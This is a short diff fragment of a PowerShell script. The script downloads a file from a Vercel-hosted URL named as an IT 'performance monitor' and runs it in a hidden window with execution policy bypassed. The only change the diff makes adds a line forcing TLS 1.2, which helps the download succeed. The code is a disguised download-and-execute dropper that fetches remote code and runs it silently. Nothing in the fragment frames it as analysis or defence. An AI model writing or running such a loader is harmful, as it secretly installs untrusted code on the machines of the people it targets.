@@ -6,6 +6,7 @@ $monitorUrl = "https://central-chamados-ti-azuos.vercel.app/monitor-desempenho-a
 if (-not (Test-Path $baseDir)) { New-Item -ItemType Directory -Path $baseDir -Force | Out-Null }
 
 try {
+  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
   Invoke-WebRequest -UseBasicParsing -Uri $monitorUrl -OutFile $monitorPath
   Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$monitorPath`""
   exit 0
